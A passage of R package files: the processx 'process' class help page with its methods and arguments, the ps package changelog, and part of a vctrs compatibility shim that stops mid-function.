     In addition to polling a single process, the 'poll()' function can
     poll the output of several processes, and returns as soon as any
     of them has generated output (or exited).

Cleaning up background processes:

     processx kills processes that are not referenced any more (if
     'cleanup' is set to 'TRUE'), or the whole subprocess tree (if
     'cleanup_tree' is also set to 'TRUE').

     The cleanup happens when the references of the processes object
     are garbage collected. To clean up earlier, you can call the
     'kill()' or 'kill_tree()' method of the process(es), from an
     'on.exit()' expression, or an error handler:

     process_manager <- function() {
       on.exit({
         try(p1$kill(), silent = TRUE)
         try(p2$kill(), silent = TRUE)
       }, add = TRUE)
       p1 <- process$new("sleep", "3")
       p2 <- process$new("sleep", "10")
       p1$wait()
       p2$wait()
     }
     process_manager()
     
     If you interrupt 'process_manager()' or an error happens then both
     'p1' and 'p2' are cleaned up immediately. Their connections will
     also be closed. The same happens at a regular exit.

Methods:

  Public methods:

         * 'process$new()'

         * 'process$finalize()'

         * 'process$kill()'

         * 'process$kill_tree()'

         * 'process$signal()'

         * 'process$interrupt()'

         * 'process$get_pid()'

         * 'process$is_alive()'

         * 'process$wait()'

         * 'process$get_exit_status()'

         * 'process$format()'

         * 'process$print()'

         * 'process$get_start_time()'

         * 'process$is_supervised()'

         * 'process$supervise()'

         * 'process$read_output()'

         * 'process$read_error()'

         * 'process$read_output_lines()'

         * 'process$read_error_lines()'

         * 'process$is_incomplete_output()'

         * 'process$is_incomplete_error()'

         * 'process$has_input_connection()'

         * 'process$has_output_connection()'

         * 'process$has_error_connection()'

         * 'process$has_poll_connection()'

         * 'process$get_input_connection()'

         * 'process$get_output_connection()'

         * 'process$get_error_connection()'

         * 'process$read_all_output()'

         * 'process$read_all_error()'

         * 'process$read_all_output_lines()'

         * 'process$read_all_error_lines()'

         * 'process$write_input()'

         * 'process$get_input_file()'

         * 'process$get_output_file()'

         * 'process$get_error_file()'

         * 'process$poll_io()'

         * 'process$get_poll_connection()'

         * 'process$get_result()'

         * 'process$as_ps_handle()'

         * 'process$get_name()'

         * 'process$get_exe()'

         * 'process$get_cmdline()'

         * 'process$get_status()'

         * 'process$get_username()'

         * 'process$get_wd()'

         * 'process$get_cpu_times()'

         * 'process$get_memory_info()'

         * 'process$suspend()'

         * 'process$resume()'

  Method 'new()':

       Start a new process in the background, and then return
       immediately.

    Usage:

         process$new(
           command = NULL,
           args = character(),
           stdin = NULL,
           stdout = NULL,
           stderr = NULL,
           pty = FALSE,
           pty_options = list(),
           connections = list(),
           poll_connection = NULL,
           env = NULL,
           cleanup = TRUE,
           cleanup_tree = FALSE,
           wd = NULL,
           echo_cmd = FALSE,
           supervise = FALSE,
           windows_verbatim_args = FALSE,
           windows_hide_window = FALSE,
           windows_detached_process = !cleanup,
           encoding = "",
           post_process = NULL
         )
         

    Arguments:

         'command' Character scalar, the command to run. Note that this
             argument is not passed to a shell, so no tilde-expansion
             or variable substitution is performed on it. It should not
             be quoted with 'base::shQuote()'. See
             'base::normalizePath()' for tilde-expansion. If you want
             to run '.bat' or '.cmd' files on Windows, make sure you
             read the 'Batch files' section above.

         'args' Character vector, arguments to the command. They will
             be passed to the process as is, without a shell
             transforming them, They don't need to be escaped.

         'stdin' What to do with the standard input. Possible values:

               * 'NULL': set to the _null device_, i.e. no standard
                 input is provided;

               * a file name, use this file as standard input;

               * '"|"': create a (writeable) connection for stdin.

               * '""' (empty string): inherit it from the main R
                 process. If the main R process does not have a
                 standard input stream, e.g. in RGui on Windows, then
                 an error is thrown.

         'stdout' What to do with the standard output. Possible values:

               * 'NULL': discard it;

               * A string, redirect it to this file. Note that if you
                 specify a relative path, it will be relative to the
                 current working directory, even if you specify another
                 directory in the 'wd' argument. (See issue 324.)

               * '"|"': create a connection for it.

               * '""' (empty string): inherit it from the main R
                 process. If the main R process does not have a
                 standard output stream, e.g. in RGui on Windows, then
                 an error is thrown.

         'stderr' What to do with the standard error. Possible values:

               * 'NULL': discard it.

               * A string, redirect it to this file. Note that if you
                 specify a relative path, it will be relative to the
                 current working directory, even if you specify another
                 directory in the 'wd' argument. (See issue 324.)

               * '"|"': create a connection for it.

               * '"2>&1"': redirect it to the same connection (i.e.
                 pipe or file) as 'stdout'. '"2>&1"' is a way to keep
                 standard output and error correctly interleaved.

               * '""' (empty string): inherit it from the main R
                 process. If the main R process does not have a
                 standard error stream, e.g. in RGui on Windows, then
                 an error is thrown.

         'pty' Whether to create a pseudo terminal (pty) for the
             background process. This is currently only supported on
             Unix systems, but not supported on Solaris. If it is
             'TRUE', then the 'stdin', 'stdout' and 'stderr' arguments
             must be 'NULL'. If a pseudo terminal is created, then
             processx will create pipes for standard input and standard
             output. There is no separate pipe for standard error,
             because there is no way to distinguish between stdout and
             stderr on a pty. Note that the standard output connection
             of the pty is _blocking_, so we always poll the standard
             output connection before reading from it using the
             $read_output() method. Also, because $read_output_lines()
             could still block if no complete line is available, this
             function always fails if the process has a pty. Use
             $read_output() to read from ptys.

         'pty_options' Unix pseudo terminal options, a named list. see
             'default_pty_options()' for details and defaults.

         'connections' A list of processx connections to pass to the
             child process. This is an experimental feature currently.

         'poll_connection' Whether to create an extra connection to the
             process that allows polling, even if the standard input
             and standard output are not pipes. If this is 'NULL' (the
             default), then this connection will be only created if
             standard output and standard error are not pipes, and
             'connections' is an empty list. If the poll connection is
             created, you can query it via 'p$get_poll_connection()'
             and it is also included in the response to 'p$poll_io()'
             and 'poll()'. The numeric file descriptor of the poll
             connection comes right after 'stderr' (2), and the
             connections listed in 'connections'.

         'env' Environment variables of the child process. If 'NULL',
             the parent's environment is inherited. On Windows, many
             programs cannot function correctly if some environment
             variables are not set, so we always set 'HOMEDRIVE',
             'HOMEPATH', 'LOGONSERVER', 'PATH', 'SYSTEMDRIVE',
             'SYSTEMROOT', 'TEMP', 'USERDOMAIN', 'USERNAME',
             'USERPROFILE' and 'WINDIR'. To append new environment
             variables to the ones set in the current process, specify
             '"current"' in 'env', without a name, and the appended
             ones with names. The appended ones can overwrite the
             current ones.

         'cleanup' Whether to kill the process when the 'process'
             object is garbage collected.

         'cleanup_tree' Whether to kill the process and its child
             process tree when the 'process' object is garbage
             collected.

         'wd' Working directory of the process. It must exist. If
             'NULL', then the current working directory is used.

         'echo_cmd' Whether to print the command to the screen before
             running it.

         'supervise' Whether to register the process with a supervisor.
             If 'TRUE', the supervisor will ensure that the process is
             killed when the R process exits.

         'windows_verbatim_args' Whether to omit quoting the arguments
             on Windows. It is ignored on other platforms.

         'windows_hide_window' Whether to hide the application's window
             on Windows. It is ignored on other platforms.

         'windows_detached_process' Whether to use the
             'DETACHED_PROCESS' flag on Windows. If this is 'TRUE',
             then the child process will have no attached console, even
             if the parent had one.

         'encoding' The encoding to assume for 'stdin', 'stdout' and
             'stderr'. By default the encoding of the current locale is
             used. Note that 'processx' always reencodes the output of
             the 'stdout' and 'stderr' streams in UTF-8 currently. If
             you want to read them without any conversion, on all
             platforms, specify '"UTF-8"' as encoding.

         'post_process' An optional function to run when the process
             has finished. Currently it only runs if $get_result() is
             called. It is only run once.


    Returns:

         R6 object representing the process.


  Method 'finalize()':

       Cleanup method that is called when the 'process' object is
       garbage collected. If requested so in the process constructor,
       then it eliminates all processes in the process's subprocess
       tree.

    Usage:

         process$finalize()
         

  Method 'kill()':

       Terminate the process. It also terminate all of its child
       processes, except if they have created a new process group (on
       Unix), or job object (on Windows). It returns 'TRUE' if the
       process was terminated, and 'FALSE' if it was not (because it
       was already finished/dead when 'processx' tried to terminate
       it).

    Usage:

         process$kill(grace = 0.1, close_connections = TRUE)
         

    Arguments:

         'grace' Currently not used.

         'close_connections' Whether to close standard input, standard
             output, standard error connections and the poll
             connection, after killing the process.


  Method 'kill_tree()':

       Process tree cleanup. It terminates the process (if still
       alive), together with any child (or grandchild, etc.) processes.
       It uses the _ps_ package, so that needs to be installed, and
       _ps_ needs to support the current platform as well. Process tree
       cleanup works by marking the process with an environment
       variable, which is inherited in all child processes. This allows
       finding descendents, even if they are orphaned, i.e. they are
       not connected to the root of the tree cleanup in the process
       tree any more. $kill_tree() returns a named integer vector of
       the process ids that were killed, the names are the names of the
       processes (e.g. '"sleep"', '"notepad.exe"', '"Rterm.exe"',
       etc.).

    Usage:

         process$kill_tree(grace = 0.1, close_connections = TRUE)
         

    Arguments:

         'grace' Currently not used.

         'close_connections' Whether to close standard input, standard
             output, standard error connections and the poll
             connection, after killing the process.


  Method 'signal()':

       Send a signal to the process. On Windows only the 'SIGINT',
       'SIGTERM' and 'SIGKILL' signals are interpreted, and the special
       0 signal. The first three all kill the process. The 0 signal
       returns 'TRUE' if the process is alive, and 'FALSE' otherwise.
       On Unix all signals are supported that the OS supports, and the
       0 signal as well.

    Usage:

         process$signal(signal)
         

    Arguments:

         'signal' An integer scalar, the id of the signal to send to
             the process. See 'tools::pskill()' for the list of
             signals.


  Method 'interrupt()':

       Send an interrupt to the process. On Unix this is a 'SIGINT'
       signal, and it is usually equivalent to pressing CTRL+C at the
       terminal prompt. On Windows, it is a CTRL+BREAK keypress.
       Applications may catch these events. By default they will quit.

    Usage:

         process$interrupt()
         

  Method 'get_pid()':

       Query the process id.

    Usage:

         process$get_pid()
         

    Returns:

         Integer scalar, the process id of the process.


  Method 'is_alive()':

       Check if the process is alive.

    Usage:

         process$is_alive()
         

    Returns:

         Logical scalar.


  Method 'wait()':

       Wait until the process finishes, or a timeout happens. Note that
       if the process never finishes, and the timeout is infinite (the
       default), then R will never regain control. In some rare cases,
       $wait() might take a bit longer than specified to time out. This
       happens on Unix, when another package overwrites the processx
       'SIGCHLD' signal handler, after the processx process has
       started. One such package is parallel, if used with fork
       clusters, e.g. through 'parallel::mcparallel()'.

    Usage:

         process$wait(timeout = -1)
         

    Arguments:

         'timeout' Timeout in milliseconds, for the wait or the I/O
             polling.


    Returns:

         It returns the process itself, invisibly.


  Method 'get_exit_status()':

       $get_exit_status returns the exit code of the process if it has
       finished and 'NULL' otherwise. On Unix, in some rare cases, the
       exit status might be 'NA'. This happens if another package (or R
       itself) overwrites the processx 'SIGCHLD' handler, after the
       processx process has started. In these cases processx cannot
       determine the real exit status of the process. One such package
       is parallel, if used with fork clusters, e.g. through the
       'parallel::mcparallel()' function.

    Usage:

         process$get_exit_status()
         

  Method 'format()':

       'format(p)' or 'p$format()' creates a string representation of
       the process, usually for printing.

    Usage:

         process$format()
         

  Method 'print()':

       'print(p)' or 'p$print()' shows some information about the
       process on the screen, whether it is running and it's process
       id, etc.

    Usage:

         process$print()
         

  Method 'get_start_time()':

       $get_start_time() returns the time when the process was started.

    Usage:

         process$get_start_time()
         

  Method 'is_supervised()':

       $is_supervised() returns whether the process is being tracked by
       supervisor process.

    Usage:

         process$is_supervised()
         

  Method 'supervise()':

       $supervise() if passed 'TRUE', tells the supervisor to start
       tracking the process. If 'FALSE', tells the supervisor to stop
       tracking the process. Note that even if the supervisor is
       disabled for a process, if it was started with 'cleanup = TRUE',
       the process will still be killed when the object is garbage
       collected.

    Usage:

         process$supervise(status)
         

    Arguments:

         'status' Whether to turn on of off the supervisor for this
             process.


  Method 'read_output()':

       $read_output() reads from the standard output connection of the
       process. If the standard output connection was not requested,
       then then it returns an error. It uses a non-blocking text
       connection. This will work only if 'stdout="|"' was used.
       Otherwise, it will throw an error.

    Usage:

         process$read_output(n = -1)
         

    Arguments:

         'n' Number of characters or lines to read.


  Method 'read_error()':

       $read_error() is similar to $read_output, but it reads from the
       standard error stream.

    Usage:

         process$read_error(n = -1)
         

    Arguments:

         'n' Number of characters or lines to read.


  Method 'read_output_lines()':

       $read_output_lines() reads lines from standard output connection
       of the process. If the standard output connection was not
       requested, then it returns an error. It uses a non-blocking text
       connection. This will work only if 'stdout="|"' was used.
       Otherwise, it will throw an error.

    Usage:

         process$read_output_lines(n = -1)
         

    Arguments:

         'n' Number of characters or lines to read.


  Method 'read_error_lines()':

       $read_error_lines() is similar to $read_output_lines, but it
       reads from the standard error stream.

    Usage:

         process$read_error_lines(n = -1)
         

    Arguments:

         'n' Number of characters or lines to read.


  Method 'is_incomplete_output()':

       $is_incomplete_output() return 'FALSE' if the other end of the
       standard output connection was closed (most probably because the
       process exited). It return 'TRUE' otherwise.

    Usage:

         process$is_incomplete_output()
         

  Method 'is_incomplete_error()':

       $is_incomplete_error() return 'FALSE' if the other end of the
       standard error connection was closed (most probably because the
       process exited). It return 'TRUE' otherwise.

    Usage:

         process$is_incomplete_error()
         

  Method 'has_input_connection()':

       $has_input_connection() return 'TRUE' if there is a connection
       object for standard input; in other words, if 'stdout="|"'. It
       returns 'FALSE' otherwise.

    Usage:

         process$has_input_connection()
         

  Method 'has_output_connection()':

       $has_output_connection() returns 'TRUE' if there is a connection
       object for standard output; in other words, if 'stdout="|"'. It
       returns 'FALSE' otherwise.

    Usage:

         process$has_output_connection()
         

  Method 'has_error_connection()':

       $has_error_connection() returns 'TRUE' if there is a connection
       object for standard error; in other words, if 'stderr="|"'. It
       returns 'FALSE' otherwise.

    Usage:

         process$has_error_connection()
         

  Method 'has_poll_connection()':

       $has_poll_connection() return 'TRUE' if there is a poll
       connection, 'FALSE' otherwise.

    Usage:

         process$has_poll_connection()
         

  Method 'get_input_connection()':

       $get_input_connection() returns a connection object, to the
       standard input stream of the process.

    Usage:

         process$get_input_connection()
         

  Method 'get_output_connection()':

       $get_output_connection() returns a connection object, to the
       standard output stream of the process.

    Usage:

         process$get_output_connection()
         

  Method 'get_error_connection()':

       $get_error_conneciton() returns a connection object, to the
       standard error stream of the process.

    Usage:

         process$get_error_connection()
         

  Method 'read_all_output()':

       $read_all_output() waits for all standard output from the
       process. It does not return until the process has finished. Note
       that this process involves waiting for the process to finish,
       polling for I/O and potentially several 'readLines()' calls. It
       returns a character scalar. This will return content only if
       'stdout="|"' was used. Otherwise, it will throw an error.

    Usage:

         process$read_all_output()
         

  Method 'read_all_error()':

       $read_all_error() waits for all standard error from the process.
       It does not return until the process has finished. Note that
       this process involves waiting for the process to finish, polling
       for I/O and potentially several 'readLines()' calls. It returns
       a character scalar. This will return content only if
       'stderr="|"' was used. Otherwise, it will throw an error.

    Usage:

         process$read_all_error()
         

  Method 'read_all_output_lines()':

       $read_all_output_lines() waits for all standard output lines
       from a process. It does not return until the process has
       finished. Note that this process involves waiting for the
       process to finish, polling for I/O and potentially several
       'readLines()' calls. It returns a character vector. This will
       return content only if 'stdout="|"' was used. Otherwise, it will
       throw an error.

    Usage:

         process$read_all_output_lines()
         

  Method 'read_all_error_lines()':

       $read_all_error_lines() waits for all standard error lines from
       a process. It does not return until the process has finished.
       Note that this process involves waiting for the process to
       finish, polling for I/O and potentially several 'readLines()'
       calls. It returns a character vector. This will return content
       only if 'stderr="|"' was used. Otherwise, it will throw an
       error.

    Usage:

         process$read_all_error_lines()
         

  Method 'write_input()':

       $write_input() writes the character vector (separated by 'sep')
       to the standard input of the process. It will be converted to
       the specified encoding. This operation is non-blocking, and it
       will return, even if the write fails (because the write buffer
       is full), or if it suceeds partially (i.e. not the full string
       is written). It returns with a raw vector, that contains the
       bytes that were not written. You can supply this raw vector to
       $write_input() again, until it is fully written, and then the
       return value will be 'raw(0)' (invisibly).

    Usage:

         process$write_input(str, sep = "\n")
         

    Arguments:

         'str' Character or raw vector to write to the standard input
             of the process. If a character vector with a marked
             encoding, it will be converted to 'encoding'.

         'sep' Separator to add between 'str' elements if it is a
             character vector. It is ignored if 'str' is a raw vector.


    Returns:

         Leftover text (as a raw vector), that was not written.


  Method 'get_input_file()':

       $get_input_file() if the 'stdin' argument was a filename, this
       returns the absolute path to the file. If 'stdin' was '"|"' or
       'NULL', this simply returns that value.

    Usage:

         process$get_input_file()
         

  Method 'get_output_file()':

       $get_output_file() if the 'stdout' argument was a filename, this
       returns the absolute path to the file. If 'stdout' was '"|"' or
       'NULL', this simply returns that value.

    Usage:

         process$get_output_file()
         

  Method 'get_error_file()':

       $get_error_file() if the 'stderr' argument was a filename, this
       returns the absolute path to the file. If 'stderr' was '"|"' or
       'NULL', this simply returns that value.

    Usage:

         process$get_error_file()
         

  Method 'poll_io()':

       $poll_io() polls the process's connections for I/O. See more in
       the _Polling_ section, and see also the 'poll()' function to
       poll on multiple processes.

    Usage:

         process$poll_io(timeout)
         

    Arguments:

         'timeout' Timeout in milliseconds, for the wait or the I/O
             polling.


  Method 'get_poll_connection()':

       $get_poll_connetion() returns the poll connection, if the
       process has one.

    Usage:

         process$get_poll_connection()
         

  Method 'get_result()':

       $get_result() returns the result of the post processesing
       function. It can only be called once the process has finished.
       If the process has no post-processing function, then 'NULL' is
       returned.

    Usage:

         process$get_result()
         

  Method 'as_ps_handle()':

       $as_ps_handle() returns a ps::ps_handle object, corresponding to
       the process.

    Usage:

         process$as_ps_handle()
         

  Method 'get_name()':

       Calls 'ps::ps_name()' to get the process name.

    Usage:

         process$get_name()
         

  Method 'get_exe()':

       Calls 'ps::ps_exe()' to get the path of the executable.

    Usage:

         process$get_exe()
         

  Method 'get_cmdline()':

       Calls 'ps::ps_cmdline()' to get the command line.

    Usage:

         process$get_cmdline()
         

  Method 'get_status()':

       Calls 'ps::ps_status()' to get the process status.

    Usage:

         process$get_status()
         

  Method 'get_username()':

       calls 'ps::ps_username()' to get the username.

    Usage:

         process$get_username()
         

  Method 'get_wd()':

       Calls 'ps::ps_cwd()' to get the current working directory.

    Usage:

         process$get_wd()
         

  Method 'get_cpu_times()':

       Calls 'ps::ps_cpu_times()' to get CPU usage data.

    Usage:

         process$get_cpu_times()
         

  Method 'get_memory_info()':

       Calls 'ps::ps_memory_info()' to get memory data.

    Usage:

         process$get_memory_info()
         

  Method 'suspend()':

       Calls 'ps::ps_suspend()' to suspend the process.

    Usage:

         process$suspend()
         

  Method 'resume()':

       Calls 'ps::ps_resume()' to resume a suspended process.

    Usage:

         process$resume()
         

Examples:

     p <- process$new("sleep", "2")
     p$is_alive()
     p
     p$kill()
     p$is_alive()
     
     p <- process$new("sleep", "1")
     p$is_alive()
     Sys.sleep(2)
     p$is_alive()
     
````

### `pscheck/ps/NEWS.md`

````text
# ps 1.9.3

* On Linux, process create times are now computed using
  `CLOCK_REALTIME - CLOCK_MONOTONIC` instead of `/proc/stat btime`, giving
  sub-second precision (previously, integer-second boot time caused up to 1s
  error). Handle validation accepts both the precise and the legacy boot time,
  so handles created by older versions of processx continue to work.
  For https://github.com/r-lib/processx/issues/394 and
  https://github.com/r-lib/processx/issues/402.

# ps 1.9.2

* New `ps_string()` for uniquely identifying a process (#208, @dansmith01).

# ps 1.9.1

* ps now builds correctly on Alpine Linux (3.19) on R 4.5.0.

# ps 1.9.0

* `ps_memory_full_info()` now contains `maxrss`, the maximum resident set
  size for the calling process.

* New `columns` argument in `ps()`, to customize what data is returned
  (#138).

# ps 1.8.1

* ps can now be installed again on unsupported platforms.

# ps 1.8.0

* New `ps_apps()` function to list all running applications on macOS.

* New function `ps_disk_io_counters()` to query disk I/O counters
  (#145, @michaelwalshe).

* New `ps_fs_info()` to query information about the file system of one
  or more files or directories.

* New `ps_wait()` to start an interruptible wait on multiple processes,
  with a timeout (#166).

* `ps_handle()` now allows a numeric (double) scalar as the pid, as long
  as its value is integer.

* `ps_send_signal()`, `ps_suspend()`, `ps_resume()`, `ps_terminate()`,
  `ps_kill()`, and `ps_interrupt()` can now operate on multiple processes,
  if passed a list of process handles.

* `ps_kill()` and `ps_kill_tree()` have a new `grace` argument.
  On Unix, if this argument is not zero, then `ps_kill()` first sends a
  `TERM` signal, and waits for the processes to quit gracefully, via
  `ps_wait()`. The processes that are still alive after the grace period
  are then killed with `SIGKILL`.

* `ps_status()` (and thus `ps()`) is now better at getting the correct
  status of processes on macOS. This usually requires calling the external
  `ps` tool. See `?ps_status()` on how to opt out from the new
  behavior (#31).

# ps 1.7.7

* `ps_cpu_times()` values are now correct on newer arm64 macOS.

# ps 1.7.6

* `ps_name()` now does not fail in the rare case when `ps_cmdline()` returns an empty vector (#150).

* `ps_system_cpu_times()` now returns CPU times divided by the HZ as reported by CLK_TCK, in-line with other OS's and the per-process version. (#144, @michaelwalshe).

# ps 1.7.5

No user visible changes.

# ps 1.7.4

* `ps::ps_get_cpu_affinity()` now works for other processes on Linux, not only
  the calling process.

# ps 1.7.3

* The output of `ps_disk_usage()`, `ps_disk_partitions()` and
  `ps_shared_lib_users()` now do not include a spurious `stringsAsFactors`
  column.

# ps 1.7.2

* `ps_system_memory()$percent` now returns a number scaled between 0 and 100
  on Windows, rather than between 0 and 1 (#131, @francisbarton).

# ps 1.7.1

* ps now returns data frames instead of tibbles. While data frames and
  tibbles are very similar, they are not completely compatible. To convert
  the output of ps to tibbles call the `tibble::as_tibble()` function
  on them.

* `ps()` now does not fail if both `user` and `after` are specified (#129).

# ps 1.7.0

* ps now compiles on platforms that enable OpenMP (#109).

* New functions `ps_get_cpu_affinity()` and `ps_set_cpu_affinity()` to query
  and set CPU affinity (#123).

* `ps_memory_info()` now does not mix up `rss` and `vms` on Linux.

* `ps_memory_info()` now reports memory in bytes instead of pages on Linux (#115)

# ps 1.6.0

* New function `ps_system_cpu_times()` to calculate system CPU times.

* New function `ps_loadavg()` to show the Unix style load average.

# ps 1.5.0

* New function `ps_shared_libs()` to list the loaded shared libraries
  of a process, on Windows.

* New function `ps_shared_lib_users()` to list all processes that
  loaded a certain shared library, on Windows.

* New function `ps_descent()` to query the ancestry of a process.

# ps 1.4.0

* ps is now under the MIT license.

* Process functions now default to the calling R process. So e.g. you can
  write simply `ps_connections()` to list all network connections of the
  current process, instead of `ps_connections(ps_handle())`.

* New `ps_get_nice()` and `ps_set_nice()` functions to get and set the
  priority of a process (#89).

* New `ps_system_memory()` and `ps_system_swap()` functions, to
  return information about system memory and swap usage.

* New `ps_disk_partitions()` and `ps_disk_usage()` functions, they
  return information about file systems, similarly to the `mount` and
  `df` Unix commands.

* New `ps_tty_size()` function to query the size of the terminal.

* Fixed an issue in `CleanupReporter()` that triggered random failures
  on macOS.

# ps 1.3.4

* `ps_cpu_count()` now reports the correct number on Windows, even if
  the package binary was built on a Windows version with a different
  API (#77).

# ps 1.3.3

* New function `errno()` returns a table of `errno.h` error codes and
  their description.

* ps now compiles again on Solaris.

# ps 1.3.2

* ps now compiles again on unsupported platforms like Solaris.

# ps 1.3.1

* Fixed an installation problem on some Windows versions, where the
  output of `cmd /c ver` looks different (#69).

# ps 1.3.0

* New `ps_cpu_count()` function returns the number of logical or
  physical processors.

# ps 1.2.1

* Fix a crash on Linux, that happened at load time (#50).

# ps 1.2.0

* New `ps_connections()` to list network connections. The
  `CleanupReporter()` testthat reporter can check for leftover open
  network connections in test cases.

* `ps_open_files()` does not include open sockets now on Linux, they are
  rather included in `ps_connections()`.

* `CleanupReporter()` now ignores `/dev/urandom`, some packages (curl,
  openssl, etc.) keep this file open.

* Fix `ps()` printing without the tibble package (#43).

* Fix compilation with ICC (#39).

* Fix a crash on Linux (#47).

# ps 1.1.0

* New `ps_num_fds()` returns the number of open files/handles.

* New `ps_open_files()` lists all open files of a process.

* New `ps_interrupt()` interrupts a process. It sends a `SIGINT` signal on
  POSIX systems, and it can send CTRL+C or CTRL+BREAK events on Windows.

* New `ps_users()` lists users connected to the system.

* New `ps_mark_tree()`, `ps_find_tree()`, `ps_kill_tree()`,
  `with_process_cleanup()`: functions to mark and clean up child
  processes.

* New `CleanupReporter`, to be used with testthat: it checks for
  leftover child processes and open files in `test_that()` blocks.

# ps 1.0.0

First released version.
````

### `pscheck/ps/R/cleancall.R`

````r
call_with_cleanup <- function(ptr, ...) {
  .Call(cleancall_call, pairlist(ptr, ...), parent.frame())
}
````

### `pscheck/ps/R/compat-vctrs.R`

````r
# nocov start

compat_vctrs <- local({
  # Modified from https://github.com/r-lib/rlang/blob/master/R/compat-vctrs.R

  # Construction ------------------------------------------------------------

  # Constructs data frames inheriting from `"tbl"`. This allows the
  # pillar package to take over printing as soon as it is loaded.
  # The data frame otherwise behaves like a base data frame.
  data_frame <- function(...) {
    new_data_frame(df_list(...), .class = "tbl")
  }

  new_data_frame <- function(.x = list(), ..., .size = NULL, .class = NULL) {
    n_cols <- length(.x)
    if (n_cols != 0 && is.null(names(.x))) {
      stop("Columns must be named.", call. = FALSE)
    }

    if (is.null(.size)) {
      if (n_cols == 0) {
        .size <- 0
      } else {
        .size <- vec_size(.x[[1]])
      }
    }

    structure(
      .x,
      class = c(.class, "data.frame"),
      row.names = .set_row_names(.size),
      ...
    )
  }

  df_list <- function(..., .size = NULL) {
    vec_recycle_common(list(...), size = .size)
  }

  # Binding -----------------------------------------------------------------

  vec_rbind <- function(...) {
    xs <- vec_cast_common(list(...))
    do.call(base::rbind, xs)
  }

  vec_cbind <- function(...) {
    xs <- list(...)

    ptype <- vec_ptype_common(lapply(xs, `[`, 0))
    class <- setdiff(class(ptype), "data.frame")

    xs <- vec_recycle_common(xs)
    out <- do.call(base::cbind, xs)
    new_data_frame(out, .class = class)
  }

  # Slicing -----------------------------------------------------------------

  vec_size <- function(x) {
    if (is.data.frame(x)) {
      nrow(x)
    } else {
      length(x)
    }
  }

  vec_rep <- function(x, times) {
    i <- rep.int(seq_len(vec_size(x)), times)
    vec_slice(x, i)
  }

  vec_recycle_common <- function(xs, size = NULL) {
    sizes <- vapply(xs, vec_size, integer(1))

    n <- unique(sizes)

    if (length(n) == 1 && is.null(size)) {
      return(xs)
    }
    n <- setdiff(n, 1L)

    ns <- length(n)

    if (ns == 0) {
      if (is.null(size)) {
        return(xs)
      }
    } else if (ns == 1) {
      if (is.null(size)) {
        size <- n
      } else if (ns != size) {
        stop("Inputs can't be recycled to `size`.", call. = FALSE)
      }
    } else {
      stop("Inputs can't be recycled to a common size.", call. = FALSE)
    }

    to_recycle <- sizes == 1L
    xs[to_recycle] <- lapply(xs[to_recycle], vec_rep, size)

    xs
  }

  vec_slice <- function(x, i) {
    if (is.logical(i)) {
      i <- which(i)
    }
    stopifnot(is.numeric(i) || is.character(i))

    if (is.null(x)) {
      return(NULL)
    }

    if (is.data.frame(x)) {
      # We need to be a bit careful to be generic. First empty all
      # columns and expand the df to final size.
      out <- x[i, 0, drop = FALSE]

      # Then fill in with sliced columns
      out[seq_along(x)] <- lapply(x, vec_slice, i)

      # Reset automatic row names to work around `[` weirdness
      if (is.numeric(attr(x, "row.names"))) {
        row_names <- .set_row_names(nrow(out))
      } else {
        row_names <- attr(out, "row.names")
      }

      return(out)
    }

    d <- vec_dims(x)
    if (d == 1) {
      if (is.object(x)) {
        out <- x[i]
      } else {
        out <- x[i, drop = FALSE]
      }
    } else if (d == 2) {
      out <- x[i, , drop = FALSE]
    } else {
      j <- rep(list(quote(expr = )), d - 1)
      out <- eval(as.call(list(
        quote(`[`),
        quote(x),
        quote(i),
        j,
        drop = FALSE
      )))
    }

    out
  }
  vec_dims <- function(x) {
    d <- dim(x)
    if (is.null(d)) {
      1L
    } else {
      length(d)
    }
  }

  vec_as_location <- function(i, n, names = NULL) {
    out <- seq_len(n)
    names(out) <- names

    # Special-case recycling to size 0
    if (is_logical(i, n = 1) && !length(out)) {
      return(out)
    }

    unname(out[i])
  }

  vec_init <- function(x, n = 1L) {
    vec_slice(x, rep_len(NA_integer_, n))
  }

  vec_assign <- function(x, i, value) {
    if (is.null(x)) {
      return(NULL)
    }

    if (is.logical(i)) {
      i <- which(i)
    }
    stopifnot(
      is.numeric(i) || is.character(i)
    )

    value <- vec_recycle(value, vec_size(i))
    value <- vec_cast(value, to = x)

    d <- vec_dims(x)

    if (d == 1) {
      x[i] <- value
    } else if (d == 2) {
      x[i, ] <- value
    } else {
      stop("Can't slice-assign arrays.", call. = FALSE)
    }

    x
  }

  vec_recycle <- function(x, size) {
    if (is.null(x) || is.null(size)) {
      return(NULL)
    }

    n_x <- vec_size(x)

    if (n_x == size) {
      x
    } else if (size == 0L) {
      vec_slice(x, 0L)
    } else if (n_x == 1L) {
      vec_slice(x, rep(1L, size))
    } else {
      stop("Incompatible lengths: ", n_x, ", ", size, call. = FALSE)
    }
  }

  # Coercion ----------------------------------------------------------------

  vec_cast_common <- function(xs, to = NULL) {
    ptype <- vec_ptype_common(xs, ptype = to)
    lapply(xs, vec_cast, to = ptype)
  }

  vec_cast <- function(x, to) {
    if (is.null(x)) {
      return(NULL)
    }
    if (is.null(to)) {
      return(x)
    }

    if (vec_is_unspecified(x)) {
      return(vec_init(to, vec_size(x)))
    }

    stop_incompatible_cast <- function(x, to) {
      stop(
        sprintf(
          "Can't convert <%s> to <%s>.",
          .rlang_vctrs_typeof(x),
          .rlang_vctrs_typeof(to)
        ),
        call. = FALSE
      )
    }

    lgl_cast <- function(x, to) {
      lgl_cast_from_num <- function(x) {
        if (any(!x %in% c(0L, 1L))) {
          stop_incompatible_cast(x, to)
        }
        as.logical(x)
      }

      switch(
        .rlang_vctrs_typeof(x),
        logical = x,
        integer = ,
        double = lgl_cast_from_num(x),
        stop_incompatible_cast(x, to)
      )
    }

    int_cast <- function(x, to) {
      int_cast_from_dbl <- function(x) {
        out <- suppressWarnings(as.integer(x))
        if (any((out != x) | xor(is.na(x), is.na(out)))) {
          stop_incompatible_cast(x, to)
        } else {
          out
        }
      }

      switch(
        .rlang_vctrs_typeof(x),
        logical = as.integer(x),
        integer = x,
        double = int_cast_from_dbl(x),
        stop_incompatible_cast(x, to)
      )
    }

    dbl_cast <- function(x, to) {
      switch(
        .rlang_vctrs_typeof(x),
        logical = ,
        integer = as.double(x),
        double = x,
        stop_incompatible_cast(x, to)
      )
    }

    chr_cast <- function(x, to) {
      switch(
        .rlang_vctrs_typeof(x),
        character = x,
        stop_incompatible_cast(x, to)
      )
    }

    list_cast <- function(x, to) {
      switch(
        .rlang_vctrs_typeof(x),
        list = x,
        stop_incompatible_cast(x, to)
      )
    }

    df_cast <- function(x, to) {
      # Check for extra columns
      if (length(setdiff(names(x), names(to))) > 0) {
        stop(
